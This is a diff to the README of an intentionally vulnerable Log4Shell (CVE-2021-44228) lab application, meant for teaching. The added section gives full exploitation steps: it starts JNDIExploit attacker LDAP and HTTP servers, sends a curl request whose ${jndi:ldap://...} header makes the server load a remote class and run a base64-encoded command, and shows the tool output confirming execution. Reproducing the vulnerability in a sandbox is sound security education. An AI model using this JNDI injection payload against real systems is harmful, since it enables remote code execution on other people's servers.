@@ -1,6 +1,6 @@
-# Log4Shell vulnerable application (CVE-2021-44228)
+# Vulnerable application
 
-This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, known as [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
+This repository contains a Spring Boot web application vulnerable to `CVE-2021-44228`, known as [log4shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
 
 It uses 
 * `log-4j-core:2.14.1` (through `spring-boot-starter-log4j2`) and
@@ -23,29 +23,65 @@ docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
 
 ## Exploitation steps
 
-*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*
+Using the following steps you can reproduce a log4shell exploit. 
+If you are not familiar with how the attack works under the hood check out this [snyk learn lesson](https://learn.snyk.io/lessons/log4shell/java/).
 
-* Trigger the exploit using:
+*Note: This is highly inspired from the original [lunasec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). Run at your own risk, preferably in a sandbox environment.*
+
+**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). I therefore recommend you to used the saved version from this repository.*
+
+### Setup attacker servers
+First we have to setup the attacker servers. This consist of
+* a **LDAP server** that will redirect us to our malicious HTTP server
+* a **HTTP server** that will run the exploit
+
+We use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up the attacker servers.
+
+```bash
+git clone https://github.com/romanutti/log4shell-vulnerable-app.git
+cd log4shell-vulnerable-app/src/main/resources
+unzip unzip JNDIExploit.v1.2.zip
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+```
+
+### Triggering the exploit
+As payload we want to execute `touch /tmp/pwned` (which is corresponds to the base64-encoded `dG91Y2ggL3RtcC9wd25lZAo=`) on the vulnerable applications server.
+
+Trigger the exploit using:
 
 ```bash
 # will execute 'touch /tmp/pwned'
-curl 127.0.0.1:8080 -H 'user: ${jndi:ldap://192.168.1.4:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+curl localhost:8080 -H 'user: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 ```
 
-* Notice the warning in the server logs, that indicates that a JNDI lookup was tried:
+The output of JNDIExploit shows that the attacker servers responded with tha malicious exploit and executed the payload:
 
 ```
-2021-12-31 21:28:40.508  INFO 1 --- [           main] c.r.l.v.VulnerableApplication            : Started VulnerableApplication in 3.581 seconds (JVM running for 5.01)
-2021-12-31 21:39:21.180  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
-2021-12-31 21:39:21.180  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
-2021-12-31 21:39:21.181  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
-2021-12-31 21:39:22,308 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://192.168.1.4:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=]. javax.naming.CommunicationException: 192.168.1.4:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
-        at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)
-        at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8888...
+[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
+[+] Paylaod: command
+[+] Command: touch /tmp/pwned
+
+[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
+[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
+[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
+[+] Receive ClassRequest: Exploitjkk87OnvOH.class
+[+] Response Code: 200
+```
+
+To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:
+
+```
+$ docker exec vulnerable-app ls /tmp
+
+...
+pwned
+...
 ```
 
 ## Reference
 
-https://www.lunasec.io/docs/blog/log4j-zero-day/
-https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
-
+https://www.lunasec.io/docs/blog/log4j-zero-day/  
+https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/  
+https://github.com/christophetd/log4shell-vulnerable-app/
